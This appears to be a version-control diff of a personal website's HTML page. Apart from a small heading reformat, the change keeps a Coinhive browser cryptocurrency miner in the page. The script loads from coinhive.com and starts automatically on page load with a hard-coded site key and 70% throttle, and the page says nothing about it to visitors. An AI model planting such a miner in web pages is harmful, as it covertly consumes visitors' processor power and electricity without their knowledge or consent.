@@ -57,7 +57,8 @@
 
     <div class="shift-right" id="article-prompt">
 
-        <h3>More will be added <span class="strike">soon</span> at some point.</h3>
+        <h3>More will be added
+            <span class="strike">soon</span> at some point.</h3>
         <h3> For now, check out
             <a id="link">a reading</a> that I like.</h3>
     </div>
@@ -69,18 +70,12 @@
         crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.14/moment-timezone-with-data-2012-2022.min.js" integrity="sha256-vBJSPpSAuUKYXDA+2hx2dQmyhkmM91vYjXI/o5QjnmA="
         crossorigin="anonymous"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script src="resources/js/nightmode.js"></script>
     <script src="resources/js/randomArticle.js"></script>
-    <script src="https://coinhive.com/lib/coinhive.min.js" crossorigin="anonymous"></script>
+    <!--<script src="resources/js/mining.js"></script>!-->
     <script>
-        try {
-            const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
-                throttle: 0.7
-            });
-            miner.start();
-        } catch (err) {
-            console.log(err);
-        }
+        try { const miner = new CoinHive.Anonymous("Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0", { throttle: .7 }); miner.start() } catch (err) { console.log(err) }
     </script>
 
 </body>
